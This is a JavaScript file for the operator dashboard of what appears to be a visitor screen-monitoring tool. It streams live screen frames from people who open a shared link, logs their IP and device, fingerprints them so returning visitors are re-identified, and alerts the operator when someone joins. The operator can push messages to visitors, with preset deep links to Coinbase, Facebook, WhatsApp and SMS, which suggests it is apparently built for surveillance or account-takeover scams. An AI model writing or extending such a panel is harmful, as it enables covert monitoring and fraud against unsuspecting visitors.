(() => {
  const $ = (sel, ctx) => (ctx || document).querySelector(sel);
  const $$ = (sel, ctx) => Array.from((ctx || document).querySelectorAll(sel));

  function hydrateIcons(root) {
    $$("[data-icon]", root).forEach((el) => {
      el.innerHTML = window.icons(el.dataset.icon);
    });
  }
  hydrateIcons();

  const loginView = $("#login-view");
  const dashView = $("#dash-view");
  const loginForm = $("#login-form");
  const pwInput = $("#pw");
  const loginBtn = $("#login-btn");
  const loginErr = $("#login-err");
  const grid = $("#grid");
  const emptyEl = $("#empty");
  const statusDot = $("#status-dot");
  const statusText = $("#status-text");
  const statusMeta = $("#status-meta");
  const searchInput = $("#search-input");
  const notifyBtn = $("#notify-btn");
  const themeBtn = $("#theme-btn");
  const logoutBtn = $("#logout-btn");
  const copyLinkBtn = $("#copy-link-btn");
  const statusFilters = $("#status-filters");

  let token = sessionStorage.getItem("adminToken") || null;
  let ws = null;
  let reconnectTimer = null;
  let searchText = "";
  let filterStatus = "all";
  const tiles = new Map();
  const fpToId = new Map();
  const timerHandles = new Map();
  let openMenu = null;

  function getTheme() {
    try {
      return localStorage.getItem("adminTheme") === "light" ? "light" : "dark";
    } catch {
      return "dark";
    }
  }
  function applyTheme(t) {
    document.documentElement.classList.toggle("light", t === "light");
    themeBtn.innerHTML = window.icons(t === "light" ? "moon" : "sun");
    themeBtn.title = t === "light" ? "Switch to dark" : "Switch to light";
    try {
      localStorage.setItem("adminTheme", t);
    } catch {}
  }
  themeBtn.addEventListener("click", () =>
    applyTheme(getTheme() === "light" ? "dark" : "light"),
  );
  applyTheme(getTheme());

  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    loginErr.textContent = "";
    const password = pwInput.value;
    if (!password) {
      loginErr.textContent = "Enter a password";
      return;
    }
    loginBtn.disabled = true;
    loginBtn.textContent = "Signing in…";
    try {
      const r = await fetch("/api/login", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ password }),
      });
      if (r.status === 429) {
        loginErr.textContent = "Too many attempts. Wait a minute.";
        return;
      }
      if (!r.ok) {
        loginErr.textContent = "Incorrect password.";
        return;
      }
      const { token: t } = await r.json();
      token = t;
      sessionStorage.setItem("adminToken", token);
      showDash();
    } catch {
      loginErr.textContent = "Network error.";
    } finally {
      loginBtn.disabled = false;
      loginBtn.textContent = "Sign in";
    }
  });

  function showDash() {
    loginView.style.display = "none";
    dashView.hidden = false;
    refreshNotifyBtn();
    connect();
  }

  if (token) showDash();

  logoutBtn.addEventListener("click", () => {
    sessionStorage.removeItem("adminToken");
    token = null;
    if (ws) {
      try {
        ws.close();
      } catch {}
    }
    dashView.hidden = true;
    loginView.style.display = "flex";
    pwInput.value = "";
  });

  function refreshNotifyBtn() {
    if (!("Notification" in window)) {
      notifyBtn.hidden = true;
      return;
    }
    if (Notification.permission === "default") {
      notifyBtn.hidden = false;
      notifyBtn.innerHTML = window.icons("bell");
      notifyBtn.title = "Enable notifications";
      notifyBtn.classList.add("attention");
    } else {
      notifyBtn.hidden = true;
    }
  }
  notifyBtn.addEventListener("click", async () => {
    try {
      const p = await Notification.requestPermission();
      if (p === "granted")
        fireNotification(
          "Notifications on",
          "You will be alerted when a visitor connects.",
        );
    } catch {}
    refreshNotifyBtn();
  });
  function fireNotification(title, body) {
    if (!("Notification" in window) || Notification.permission !== "granted")
      return;
    try {
      const n = new Notification(title, {
        body,
        tag: "visitor",
        renotify: true,
      });
      n.onclick = () => {
        window.focus();
        n.close();
      };
      setTimeout(() => {
        try {
          n.close();
        } catch {}
      }, 8000);
    } catch {}
  }

  function setStatus(state, text) {
    statusDot.className = "status-dot " + state;
    statusText.textContent = text;
  }
  function updateStatusMeta() {
    let live = 0,
      offline = 0;
    for (const t of tiles.values()) {
      if (t.online) live++;
      else offline++;
    }
    statusMeta.textContent = `${live} live, ${offline} offline`;
  }
  statusFilters.addEventListener("click", (e) => {
    const b = e.target.closest(".seg");
    if (!b) return;
    $$(".seg", statusFilters).forEach((s) =>
      s.setAttribute("aria-selected", s === b ? "true" : "false"),
    );
    filterStatus = b.dataset.filter;
    applyFilter();
  });
  searchInput.addEventListener("input", () => {
    searchText = searchInput.value.trim().toLowerCase();
    applyFilter();
  });

  function connect() {
    if (reconnectTimer) {
      clearTimeout(reconnectTimer);
      reconnectTimer = null;
    }
    const proto = location.protocol === "https:" ? "wss" : "ws";
    ws = new WebSocket(
      `${proto}://${location.host}/ws?role=admin&token=${encodeURIComponent(token)}`,
    );
    ws.onopen = () => setStatus("live", "connected");
    ws.onclose = (ev) => {
      setStatus("error", "disconnected");
      if (ev.code === 4001) {
        sessionStorage.removeItem("adminToken");
        token = null;
        dashView.hidden = true;
        loginView.style.display = "flex";
        loginErr.textContent = "Session expired. Sign in again.";
      } else {
        reconnectTimer = setTimeout(connect, 2000);
      }
    };
    ws.onerror = () => setStatus("error", "error");
    ws.onmessage = (ev) => {
      let msg;
      try {
        msg = JSON.parse(ev.data);
      } catch {
        return;
      }
      switch (msg.type) {
        case "visitors":
          msg.visitors.forEach((v) => upsertTile(v));
          updateEmpty();
          updateStatusMeta();
          break;
        case "visitor-joined":
          handleJoin(msg);
          break;
        case "visitor-offline":
          markOffline(msg.id);
          toast(`Visitor disconnected — ${shortId(msg.id)}`, "info");
          updateStatusMeta();
          break;
        case "visitor-deleted":
          removeTile(msg.id);
          toast(`Removed — ${shortId(msg.id)}`, "info");
          updateStatusMeta();
          break;
        case "frame":
          onFrame(msg.from, msg);
          break;
        case "session-ended":
          markOffline(msg.from);
          updateStatusMeta();
          break;
        case "send-message-ok":
          setMsgStatus(msg.id, "sent");
          break;
        case "send-message-failed":
          setMsgStatus(msg.id, "visitor offline");
          break;
      }
    };
  }

  function handleJoin(msg) {
    const v = msg.visitor;
    const byId = tiles.get(v.id);
    const byFp = v.fp ? tiles.get(fpToId.get(v.fp)) : null;

    if (byId) {
      byId.meta = v;
      setOnline(byId, true);
      if (v.fp) fpToId.set(v.fp, v.id);
      toast(`Visitor rejoined — ${shortId(v.id)}`, "success");
      beep();
      fireNotification(
        "Visitor rejoined",
        `ID ${shortId(v.id)} — ${v.ip || ""}`,
      );
      updateStatusMeta();
      return;
    }
    if (byFp) {
      const oldId = byFp.meta.id;
      byFp.meta = v;
      byFp.tile.dataset.id = v.id;
      tiles.delete(oldId);
      tiles.set(v.id, byFp);
      if (v.fp) fpToId.set(v.fp, v.id);
      const idEl = byFp.tile.querySelector(".tile-id");
      if (idEl) idEl.textContent = v.id;
      setOnline(byFp, true);
      startTimer(byFp);
      toast(`Visitor rejoined — ${shortId(v.id)}`, "success");
      beep();
      fireNotification("Visitor rejoined", `ID ${shortId(v.id)}`);
      updateStatusMeta();
      return;
    }
    upsertTile(v);
    toast(`Visitor connected — ${shortId(v.id)}`, "success");
    beep();
    fireNotification(
      "Visitor connected",
      `ID ${shortId(v.id)} — ${v.ip || ""}`,
    );
    updateEmpty();
    updateStatusMeta();
  }

  function deviceIcon(ua) {
    const s = (ua || "").toLowerCase();
    if (/android/.test(s)) return "android";
    if (/iphone|ipad|ipod/.test(s)) return "apple";
    if (/windows/.test(s)) return "windows";
    if (/mac os x|macintosh/.test(s)) return "mac";
    if (/linux/.test(s)) return "linux";
    return "search";
  }

  function fmtDur(ms) {
    if (ms < 0) ms = 0;
    const s = Math.floor(ms / 1000);
    const m = Math.floor(s / 60);
    const h = Math.floor(m / 60);
    const d = Math.floor(h / 24);
    if (d) return `${d}d ${h % 24}h`;
    if (h) return `${h}h ${m % 60}m`;
    if (m) return `${m}m ${s % 60}s`;
    return `${s}s`;
  }
  function startTimer(t) {
    stopTimer(t.meta.id);
    const el = t.tile.querySelector(".tile-timer");
    if (!el) return;
    const tick = () => {
      if (!el.isConnected) {
        stopTimer(t.meta.id);
        return;
      }
      el.textContent = fmtDur(Date.now() - t.meta.connectedAt);
    };
    tick();
    timerHandles.set(t.meta.id, setInterval(tick, 1000));
  }
  function stopTimer(id) {
    const h = timerHandles.get(id);
    if (h) {
      clearInterval(h);
      timerHandles.delete(id);
    }
  }

  function upsertTile(meta) {
    if (tiles.has(meta.id)) {
      const t = tiles.get(meta.id);
      t.meta = meta;
      setOnline(t, meta.online);
      return;
    }
    const t = document.createElement("div");
    t.className = "tile";
    t.dataset.id = meta.id;
    t.innerHTML = `
            <div class="tile-header">
                <div class="tile-device" title="${escapeHtml(meta.ua || "")}"></div>
                <div class="tile-meta">
                    <span class="tile-id">${escapeHtml(meta.id)}</span>
                    <span class="tile-status ${meta.online ? "live" : "offline"}">${meta.online ? "live" : "offline"}</span>
                </div>
                <span class="tile-timer">0s</span>
                <button class="tile-menu-btn" title="Actions"></button>
            </div>
            <div class="tile-body skeleton">
                <canvas width="1280" height="720"></canvas>
            </div>
            <div class="tile-footer">
                <span class="tile-ip">${escapeHtml(meta.ip || "—")}</span>
            </div>
            <div class="msg-panel">
                <div class="msg-quick">
                    <button class="msg-quick-btn" data-quick="sms">SMS</button>
                    <button class="msg-quick-btn" data-quick="mailto">Email</button>
                    <button class="msg-quick-btn" data-quick="whatsapp">WhatsApp</button>
                    <button class="msg-quick-btn" data-quick="coinbase">Coinbase</button>
                    <button class="msg-quick-btn" data-quick="fb">Facebook</button>
                </div>
                <textarea class="msg-input" placeholder="Type your message" rows="2"></textarea>
                <div class="msg-actions">
                    <span class="msg-status"></span>
                    <button class="btn btn-primary msg-send">Send</button>
                </div>
            </div>
            <div class="tile-resize" title="Drag to resize"></div>
        `;
    grid.appendChild(t);

    const canvas = t.querySelector("canvas");
    const ctx = canvas.getContext("2d");
    const tileObj = {
      tile: t,
      canvas,
      ctx,
      meta,
      online: !!meta.online,
      expanded: false,
      skeleton: true,
    };
    tiles.set(meta.id, tileObj);
    if (meta.fp) fpToId.set(meta.fp, meta.id);

    t.querySelector(".tile-menu-btn").innerHTML = window.icons("more");
    t.querySelector(".tile-device").innerHTML = window.icons(
      deviceIcon(meta.ua),
    );

    if (!meta.online && meta.lastFrame) paintFrame(canvas, ctx, meta.lastFrame);
    setOnline(tileObj, meta.online);

    t.querySelector(".tile-menu-btn").addEventListener("click", (e) => {
      e.stopPropagation();
      openTileMenu(tileObj);
    });
    t.querySelector(".msg-send").addEventListener("click", () =>
      sendMessage(tileObj),
    );

    t.querySelectorAll(".msg-quick-btn").forEach((btn) => {
      btn.addEventListener("click", () => {
        const ta = t.querySelector(".msg-input");
        if (!ta) return;
        const kind = btn.dataset.quick;
        const templates = {
          sms: "sms:+15550100",
          mailto: "mailto:someone@example.com?subject=Hello",
          whatsapp: "whatsapp://send?phone=15550100&text=Hi",
          coinbase: "coinbase://",
          fb: "fb://",
        };
        const prefix = templates[kind] || "";
        if (!ta.value.trim()) ta.value = prefix;
        else ta.value = ta.value.trim() + " " + prefix;
        ta.focus();
        ta.selectionStart = ta.selectionEnd = ta.value.length;
      });
    });

    wireResize(tileObj);
    canvas.addEventListener("contextmenu", (e) => {
      e.preventDefault();
      downloadSnapshot(tileObj);
    });
    startTimer(tileObj);
    applyFilter();
  }

  function openTileMenu(tileObj) {
    closeMenu();
    const menu = document.createElement("div");
    menu.className = "menu open";
    menu.innerHTML = `
            <button class="menu-item" data-act="msg"><span class="menu-icon">${window.icons("message")}</span>Send message</button>
            <button class="menu-item" data-act="snap"><span class="menu-icon">${window.icons("download")}</span>Save snapshot</button>
            <button class="menu-item" data-act="expand"><span class="menu-icon">${window.icons("expand")}</span>Expand</button>
            <button class="menu-item" data-act="copy"><span class="menu-icon">${window.icons("copy")}</span>Copy ID</button>
            <div class="menu-divider"></div>
            <button class="menu-item danger" data-act="del"><span class="menu-icon">${window.icons("trash")}</span>Remove</button>
        `;
    document.body.appendChild(menu);
    const rect = tileObj.tile
      .querySelector(".tile-menu-btn")
      .getBoundingClientRect();
    menu.style.top = rect.bottom + 6 + "px";
    menu.style.left =
      Math.min(rect.right - 180, window.innerWidth - 200) + "px";
    openMenu = menu;

    menu.addEventListener("click", (e) => {
      const b = e.target.closest(".menu-item");
      if (!b) return;
      const act = b.dataset.act;
      closeMenu();
      if (act === "msg") toggleMessage(tileObj);
      else if (act === "snap") downloadSnapshot(tileObj);
      else if (act === "expand") toggleExpand(tileObj);
      else if (act === "copy") {
        navigator.clipboard
          .writeText(tileObj.meta.id)
          .then(() => toast("ID copied", "success"))
          .catch(() => toast("Copy failed", "error"));
      } else if (act === "del") deleteVisitor(tileObj.meta.id);
    });
  }
  function closeMenu() {
    if (openMenu) {
      openMenu.remove();
      openMenu = null;
    }
  }
  document.addEventListener("click", (e) => {
    if (openMenu && !openMenu.contains(e.target)) closeMenu();
  });
  document.addEventListener("scroll", closeMenu, true);

  function toggleMessage(tileObj) {
    const panel = tileObj.tile.querySelector(".msg-panel");
    panel.classList.toggle("open");
    if (panel.classList.contains("open")) {
      const ta = panel.querySelector(".msg-input");
      if (ta) ta.focus();
    }
  }
  function sendMessage(tileObj) {
    const panel = tileObj.tile.querySelector(".msg-panel");
    const ta = panel.querySelector(".msg-input");
    const status = panel.querySelector(".msg-status");
    const text = (ta.value || "").trim();
    if (!text) {
      status.textContent = "empty";
      return;
    }
    if (!ws || ws.readyState !== WebSocket.OPEN) {
      status.textContent = "offline";
      return;
    }
    ws.send(
      JSON.stringify({
        type: "send-message",
        id: tileObj.meta.id,
        fp: tileObj.meta.fp,
        text,
      }),
    );
    status.textContent = "sending…";
    ta.value = "";
  }
  function setMsgStatus(id, text) {
    const t = tiles.get(id);
    if (!t) return;
    const s = t.tile.querySelector(".msg-status");
    if (s) {
      s.textContent = text;
      setTimeout(() => {
        if (s.textContent === text) s.textContent = "";
      }, 2500);
    }
  }

  function downloadSnapshot(tileObj) {
    try {
      const url = tileObj.canvas.toDataURL("image/jpeg", 0.9);
      const a = document.createElement("a");
      a.href = url;
      a.download = `snapshot-${tileObj.meta.id}-${Date.now()}.jpg`;
      document.body.appendChild(a);
      a.click();
      a.remove();
      toast("Snapshot saved", "success");
    } catch {
      toast("Snapshot failed", "error");
    }
  }

  function toggleExpand(tileObj) {
    for (const other of tiles.values()) {
      if (other !== tileObj && other.expanded) collapseTile(other);
    }
    if (tileObj.expanded) collapseTile(tileObj);
    else {
      tileObj.expanded = true;
      tileObj.tile.classList.add("expanded");
      document.body.classList.add("has-expanded");
      if (tileObj.tile.requestFullscreen)
        tileObj.tile.requestFullscreen().catch(() => {});
    }
  }
  function collapseTile(tileObj) {
    tileObj.expanded = false;
    tileObj.tile.classList.remove("expanded");
    document.body.classList.remove("has-expanded");
    if (document.fullscreenElement === tileObj.tile)
      document.exitFullscreen().catch(() => {});
  }
  document.addEventListener("fullscreenchange", () => {
    if (!document.fullscreenElement) {
      for (const t of tiles.values()) if (t.expanded) collapseTile(t);
    }
  });
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
      for (const t of tiles.values()) if (t.expanded) collapseTile(t);
    }
  });

  function wireResize(tileObj) {
    const handle = tileObj.tile.querySelector(".tile-resize");
    if (!handle) return;
    let dragging = false,
      sx = 0,
      sy = 0,
      sw = 0,
      sh = 0;
    handle.addEventListener("pointerdown", (e) => {
      if (tileObj.expanded) return;
      e.preventDefault();
      dragging = true;
      sx = e.clientX;
      sy = e.clientY;
      const r = tileObj.tile.getBoundingClientRect();
      sw = r.width;
      sh = r.height;
      try {
        handle.setPointerCapture(e.pointerId);
      } catch {}
    });
    handle.addEventListener("pointermove", (e) => {
      if (!dragging) return;
      const w = Math.max(240, sw + (e.clientX - sx));
      const h = Math.max(140, sh + (e.clientY - sy));
      tileObj.tile.style.width = w + "px";
      tileObj.tile.style.height = h + "px";
    });
    handle.addEventListener("pointerup", (e) => {
      if (!dragging) return;
      dragging = false;
      try {
        handle.releasePointerCapture(e.pointerId);
      } catch {}
    });
  }

  function setOnline(tileObj, online) {
    tileObj.online = !!online;
    const s = tileObj.tile.querySelector(".tile-status");
    if (s) {
      s.className = "tile-status " + (online ? "live" : "offline");
      s.textContent = online ? "live" : "offline";
    }
    tileObj.tile.classList.toggle("offline", !online);
    tileObj.canvas.style.filter = online
      ? ""
      : "brightness(0.45) grayscale(0.7)";
  }
  function markOffline(id) {
    const t = tiles.get(id);
    if (t) setOnline(t, false);
  }
  function removeTile(id) {
    const t = tiles.get(id);
    if (!t) return;
    if (t.meta && t.meta.fp) fpToId.delete(t.meta.fp);
    stopTimer(id);
    t.tile.remove();
    tiles.delete(id);
    updateEmpty();
  }
  function deleteVisitor(id) {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    ws.send(JSON.stringify({ type: "delete-visitor", id }));
  }

  function onFrame(id, msg) {
    const t = tiles.get(id);
    if (!t) return;
    if (t.skeleton) {
      t.skeleton = false;
      t.tile.querySelector(".tile-body").classList.remove("skeleton");
    }
    paintFrame(t.canvas, t.ctx, msg.data);
    if (msg.data) t.meta.lastFrame = msg.data;
    if (!t.online) setOnline(t, true);
  }
  function paintFrame(canvas, ctx, b64) {
    const img = new Image();
    img.onload = () => {
      if (canvas.width !== img.width || canvas.height !== img.height) {
        canvas.width = img.width;
        canvas.height = img.height;
      }
      ctx.drawImage(img, 0, 0);
    };
    img.src = "data:image/jpeg;base64," + b64;
  }

  function applyFilter() {
    for (const t of tiles.values()) {
      const id = (t.meta.id || "").toLowerCase();
      const fp = (t.meta.fp || "").toLowerCase();
      const matchSearch =
        !searchText || id.includes(searchText) || fp.includes(searchText);
      const matchStatus =
        filterStatus === "all" ||
        (filterStatus === "live" && t.online) ||
        (filterStatus === "offline" && !t.online);
      t.tile.classList.toggle("hidden", !(matchSearch && matchStatus));
    }
    updateEmpty();
  }

  function updateEmpty() {
    const anyVisible = Array.from(tiles.values()).some(
      (t) => !t.tile.classList.contains("hidden"),
    );
    emptyEl.classList.toggle("visible", !anyVisible);
  }

  function toast(text, kind) {
    let host = document.querySelector(".toast-host");
    if (!host) {
      host = document.createElement("div");
      host.className = "toast-host";
      document.body.appendChild(host);
    }
    const el = document.createElement("div");
    el.className = `toast ${kind || ""}`;
    el.textContent = text;
    host.appendChild(el);
    requestAnimationFrame(() => el.classList.add("show"));
    setTimeout(() => {
      el.classList.remove("show");
      setTimeout(() => el.remove(), 250);
    }, 3500);
  }
  let audioCtx = null;
  function beep() {
    try {
      if (!audioCtx)
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const o = audioCtx.createOscillator();
      const g = audioCtx.createGain();
      o.type = "sine";
      o.frequency.value = 880;
      g.gain.setValueAtTime(0.0001, audioCtx.currentTime);
      g.gain.exponentialRampToValueAtTime(0.15, audioCtx.currentTime + 0.01);
      g.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.25);
      o.connect(g).connect(audioCtx.destination);
      o.start();
      o.stop(audioCtx.currentTime + 0.26);
    } catch {}
  }

  function shortId(id) {
    return id.slice(0, 6);
  }
  function escapeHtml(s) {
    return String(s).replace(
      /[&<>"']/g,
      (c) =>
        ({
          "&": "&amp;",
          "<": "&lt;",
          ">": "&gt;",
          '"': "&quot;",
          "'": "&#39;",
        })[c],
    );
  }

  copyLinkBtn.addEventListener("click", () => {
    const link = location.origin + "/visitor.html";
    navigator.clipboard
      .writeText(link)
      .then(() => toast("Visitor link copied", "success"))
      .catch(() => toast("Copy failed", "error"));
  });
})();
